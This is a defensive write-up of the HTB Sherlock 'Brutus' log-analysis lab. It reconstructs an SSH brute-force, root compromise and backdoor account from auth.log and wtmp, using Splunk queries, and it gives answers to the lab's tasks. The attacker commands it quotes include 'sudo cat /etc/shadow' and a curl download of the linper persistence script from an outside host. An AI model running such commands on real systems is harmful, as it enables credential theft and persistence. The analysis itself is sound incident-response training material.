# HTB Sherlock: Brutus

**Category:** DFIR / Log Analysis
**Artifacts:** `auth.log` (Linux syslog auth), `wtmp` (binary login records), `utmp.py` (wtmp parser)
**Platform used:** Splunk (self-hosted)
**Scenario:** SSH brute-force against a Confluence server, successful root compromise, persistence via backdoor account, and post-exploitation script download.

---

## Tools used

| Tool | What it did in this lab |
|------|-------------------------|
| **7-Zip** | Extracted the AES-encrypted archive (`Brutus.zip`, password `hacktheblue`). Windows' built-in zip can't handle AES — threw error `0x80004005`. |
| **Splunk** | SIEM. Ingested `auth.log` via **Add Data → Upload**, sourcetype **`linux_secure`**. All timeline analysis done with SPL. |
| **rex (SPL)** | `linux_secure` doesn't auto-extract fields, so `src_ip` and `user` were pulled at search time with `rex`. |
| **utmp.py** | Parsed the `wtmp` binary into readable login/logout records to get the true terminal-session login time (Task 3). |

**Tool → step map**
- 7-Zip → extract `auth.log`, `wtmp`, `utmp.py`
- Splunk Upload + `linux_secure` → ingest `auth.log`
- `rex` / Field Extractor → `src_ip`, `user` fields
- SPL searches → brute-force source, accepted login, session IDs, `useradd`, sudo command
- `utmp.py wtmp` → manual terminal login timestamp

> **Year gotcha:** syslog lines have no year, so Splunk stamped the current year. The real year is **2024** (file modified date `3/6/2024`). All submitted timestamps use 2024.

---

## Attack timeline

| Time (UTC, 2024-03-06) | Event |
|------|-------|
| ~06:31:xx | Brute force from `65.2.161.68` — targets `root`, `backup`, invalid users `admin`, `svc_account`, `server_adm` |
| 06:31:40 | First `Accepted password for root` (session 34, port 34782) — automated tool hit, logs out same second |
| 06:32:44 | Manual `Accepted password for root` (session 37, port 53184) — interactive login |
| 06:32:45 | wtmp terminal session established (root) |
| 06:34:18 | `useradd` → new user **cyberjunkie** (UID 1002) + matching group |
| 06:35:15 | `cyberjunkie` added to **sudo** group |
| 06:37:24 | Session 37 (root) closed — attacker **logs out of root** |
| 06:37:34 | Attacker **logs back in as `cyberjunkie`** via SSH (session 49, port 43260) — switches to the backdoor account |
| 06:37:57 | `sudo cat /etc/shadow` |
| 06:39:38 | `sudo curl .../linper.sh` — persistence script download |

---

## Task answers

**Task 1 — Brute-force source IP**
`65.2.161.68`
```
source="auth.log" "Failed password" | rex "from (?<src_ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})" | stats count by src_ip | sort -count
```
Single IP responsible for all failed-password attempts.

**Task 2 — Compromised account**
`root`
`Accepted password for root from 65.2.161.68` — the only successful auth from the attacker IP.

**Task 3 — Manual terminal login time (from wtmp)**
`2024-03-06 06:32:45`
Auth time (`Accepted password`) is 06:32:44; the wtmp session-establishment record is one second later. Question asks specifically for the wtmp value.

**Task 4 — Session number of attacker's root session**
`37`
Two root sessions exist: 34 (06:31:40, automated tool, closes instantly) and 37 (06:32:44, port 53184, interactive, lives ~5 min). The hands-on session is 37 — assigned by `systemd-logind: New session 37 of user root`.

**Task 5 — New account added for persistence**
`cyberjunkie`
`useradd[2592]: new user: name=cyberjunkie, UID=1002 ... shell=/bin/bash`, then added to the `sudo` group.

**Task 6 — MITRE ATT&CK sub-technique (persistence via new account)**
`T1136.001` — Create Account: Local Account

**Task 7 — First SSH session end time (auth.log)**
`2024-03-06 06:37:24`
`Removed session 37` / `Session 37 logged out`.

**Task 8 — Full sudo command to download script**
`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
From `sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=...` at 06:39:38. `linper` is a Linux persistence enumeration/automation tool.

> **Tradecraft note:** the attacker logged out of the brute-forced `root` session (06:37:24) and logged back in through their own backdoor account `cyberjunkie` (06:37:34), then used `sudo` from there. They abandoned the noisy compromised account and operated from the persistence account they controlled — the `USER=root` in the sudo line shows them escalating back to root via their sudo rights, not via the original SSH session.

---

## Key takeaways

- **Auth time ≠ login time.** SSH `Accepted password` (auth.log) and the terminal session start (wtmp) can differ by seconds — know which artifact the question wants.
- **Distinguish automated vs interactive sessions** by duration. A brute-force tool's successful hit opens and closes in the same second; the human's session persists and generates follow-on activity.
- **Correlate `systemd-logind` for session IDs** — `sshd` authenticates, but `logind` assigns the session number.
- **Linux has no Event IDs** — pivot on message strings (`Failed password`, `Accepted password`, `new user`, `sudo ... COMMAND=`).
